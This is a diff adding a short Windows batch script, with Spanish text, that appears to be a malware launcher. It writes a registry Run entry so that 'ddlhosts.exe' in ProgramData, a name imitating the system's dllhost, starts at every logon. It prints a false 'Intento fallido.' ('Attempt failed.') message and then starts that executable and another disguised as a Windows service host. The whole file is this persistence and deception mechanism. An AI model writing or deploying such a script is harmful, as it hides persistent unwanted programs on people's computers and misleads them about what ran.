@@ -1,0 +1,14 @@
+@echo off
+
+set KEY_NAME="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
+set VALUE_NAME="MiPrograma"
+set VALUE_DATA="C:\ProgramData\ddlhosts.exe"
+
+reg add %KEY_NAME% /v %VALUE_NAME% /t REG_SZ /d %VALUE_DATA% /f
+
+echo Intento fallido.
+
+start "" "C:\ProgramData\Host de servicio local (...).exe"
+start "" "C:\ProgramData\ddlhosts.exe"
+exit
+
